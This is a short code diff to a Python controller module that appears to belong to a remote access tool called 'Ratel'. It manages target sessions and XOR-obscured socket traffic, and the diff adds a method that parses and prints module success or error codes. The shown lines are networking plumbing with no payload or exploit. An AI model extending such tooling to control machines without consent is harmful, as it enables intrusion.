@@ -10,6 +10,8 @@ from .other import printColor
 from .other import XOREncryption
 from .other import pingAllTarget
 from .other import NB_SESSION , NB_SOCKET , NB_IP , NB_PORT , NB_ALIVE , NB_ADMIN , NB_PATH , NB_USERNAME , NB_TOKEN,NB_SELECT ,SOCK_TIMEOUT
+from .other import SPLIT
+from .other import dict_error_codes
 
 
 class Management(threading.Thread):
@@ -81,7 +83,7 @@ class CheckConn:
 
     def recvall(self,sock,buffer):
     #Receives multiple data with timeout
-        result =b""
+        result = b""
         sock.settimeout(SOCK_TIMEOUT)
         
         while True:
@@ -170,11 +172,31 @@ class CheckConn:
 
 
         sock.settimeout(None)
-    
-    '''
-    Note: 
-    When sending and receiving commands, the buffer must be small.
-    This avoids bugs with the XOREncryption function.
-    It is also necessary that when decoding the data, the "replace" argument is preferable to "ignore". Because there is a lot of interaction problem between unicode data and the XOREncryption function.
-    '''
 
+
+    def recvmod(self,sock, buff):
+
+        result=""
+        reponse_mod = self.recvsafe(sock, buff)
+
+        try:
+            
+            result = reponse_mod.split(SPLIT)[1]
+            print("result->", result)
+
+        except Exception as e:
+            print(e) # to delete
+
+        finally:
+
+            if result ==  "RATEL_ERROR_SUCCESS": #"RATEL_ERROR_SUCCESS":
+                printColor("successfully", "\n[+] "+dict_error_codes["RATEL_ERROR_SUCCESS"])
+            
+            elif result == "RATEL_ERROR_FAILS":
+                printColor("error", "\n[-] "+dict_error_codes["RATEL_ERROR_FAILS"])
+            
+            else:
+                printColor("error", "An unknown error has occurred. ")
+
+            print("\n")
+    
